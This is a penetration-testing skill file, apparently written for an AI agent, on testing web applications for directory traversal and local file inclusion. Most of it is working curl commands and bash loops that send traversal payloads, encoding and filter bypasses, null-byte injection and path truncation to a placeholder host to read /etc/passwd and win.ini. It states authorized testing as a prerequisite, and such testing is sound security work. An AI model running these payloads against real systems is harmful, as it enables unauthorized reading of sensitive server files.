---
name: performing-directory-traversal-testing
description: Test web applications for path traversal and Local/Remote File Inclusion
when-to-use: Test web applications for path traversal and Local/Remote File Inclusion
  vulnerabilities by manipulating file path parameters, applying encoding and filter-bypass
  techniques, automating discovery with ffuf and dotdotpwn, and reading high-value files
  or achieving code execution. Use during authorized penetration tests of file download,
  view, or include functionality, or when assessing APIs that accept file names or file
  paths as parameters.
domain: cybersecurity
subdomain: web-application-security
tags:
- penetration-testing
- directory-traversal
- path-traversal
- lfi
- owasp
- web-security
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
mitre_attack:
- T1190
- T1059.007
- T1505.003
- T1083
---

# Performing Directory Traversal Testing

## When to Use

- During authorized penetration tests when the application handles file paths in URL parameters or request bodies
- When testing file download, file view, or file include functionality
- For assessing Local File Inclusion (LFI) and Remote File Inclusion (RFI) vulnerabilities
- When evaluating template engines, logging systems, or report generators that reference files
- During security assessments of APIs that accept file names or paths as parameters

## Prerequisites

- **Authorization**: Written penetration testing agreement for the target
- **Burp Suite Professional**: For intercepting and modifying file path parameters
- **ffuf**: For fuzzing file path parameters with traversal payloads
- **dotdotpwn**: Automated directory traversal fuzzer (`apt install dotdotpwn`)
- **SecLists**: Traversal payload wordlists from Daniel Miessler's collection
- **curl**: For manual testing of traversal payloads

## Workflow

### Step 1: Identify File Path Parameters

Find application endpoints that reference files through parameters.

```bash
# Common file-handling patterns to look for:
# /download?file=report.pdf
# /view?page=about.html
# /api/files?path=documents/invoice.pdf
# /template?name=header.html
# /include?module=sidebar
# /image?src=photos/avatar.jpg
# /export?format=csv&template=default

# In Burp Suite, search proxy history for file-related parameters
# Filter by parameter names: file, path, page, template, include,
# module, src, doc, document, folder, dir, name, filename

# Test with a known valid file to establish baseline
curl -s "https://target.example.com/download?file=report.pdf" -o /dev/null -w "%{http_code} %{size_download}"

# Try referencing a file that shouldn't be accessible
curl -s "https://target.example.com/download?file=../../../etc/passwd"
```

### Step 2: Test Basic Directory Traversal Payloads

Attempt to escape the intended directory and read sensitive files.

```bash
# Linux traversal payloads
PAYLOADS=(
  "../../../etc/passwd"
  "../../../../etc/passwd"
  "../../../../../etc/passwd"
  "../../../../../../etc/passwd"
  "../../../../../../../etc/passwd"
  "..%2f..%2f..%2fetc%2fpasswd"
  "..%252f..%252f..%252fetc%252fpasswd"
  "%2e%2e/%2e%2e/%2e%2e/etc/passwd"
  "....//....//....//etc/passwd"
  "..;/..;/..;/etc/passwd"
)

for payload in "${PAYLOADS[@]}"; do
  echo -n "Testing: $payload -> "
  response=$(curl -s "https://target.example.com/download?file=$payload")
  if echo "$response" | grep -q "root:"; then
    echo "VULNERABLE"
  else
    echo "Blocked"
  fi
done

# Windows traversal payloads
WIN_PAYLOADS=(
  "..\..\..\windows\win.ini"
  "..%5c..%5c..%5cwindows%5cwin.ini"
  "..\/..\/..\/windows/win.ini"
  "....\\....\\....\\windows\\win.ini"
)

for payload in "${WIN_PAYLOADS[@]}"; do
  echo -n "Testing: $payload -> "
  curl -s "https://target.example.com/download?file=$payload" | head -c 100
  echo
done
```

### Step 3: Apply Encoding and Filter Bypass Techniques

Use various encoding schemes to bypass input validation filters.

```bash
# URL encoding bypass
curl -s "https://target.example.com/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# Double URL encoding
curl -s "https://target.example.com/download?file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"

# UTF-8 encoding
curl -s "https://target.example.com/download?file=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"

# Null byte injection (PHP < 5.3.4)
curl -s "https://target.example.com/download?file=../../../etc/passwd%00.pdf"

# Path truncation (Windows)
# Exceeding MAX_PATH (260 chars) to bypass extension checks
LONG_PATH="../../../etc/passwd"
for i in $(seq 1 200); do LONG_PATH="${LONG_PATH}/."; done
curl -s "https://target.example.com/download?file=$LONG_PATH"

# Case manipulation (Windows)
curl -s "https://target.example.com/download?file=..\..\..\..\WiNdOwS\win.ini"

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
